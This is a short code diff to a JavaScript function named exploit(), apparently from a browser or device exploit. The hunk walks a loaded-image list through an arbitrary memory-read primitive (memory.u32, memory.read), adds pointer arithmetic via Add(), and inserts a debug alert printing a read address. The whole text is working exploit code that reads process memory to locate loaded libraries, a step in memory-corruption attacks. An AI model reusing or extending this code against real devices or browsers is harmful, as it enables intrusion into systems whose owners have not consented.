@@ -688,8 +688,9 @@ function exploit(){
         var nimgs = memory.u32(Add(hdr, 0x1c));
         for(var i = 0; i < nimgs; ++i)
         {
-            var m = i * 0x20
-            var straddr = off2addr(segs, memory.u32(imgs + m + 0x18));
+            var m = i * 0x20;
+            alert(memory.u32(Add(Add(imgs,m),0x18)))
+            var straddr = off2addr(segs, memory.u32(Add(Add(imgs,m),0x18)));
             var fn = function(i)
             {
                 var g = memory.read(Add(straddr, i), 1)[0];
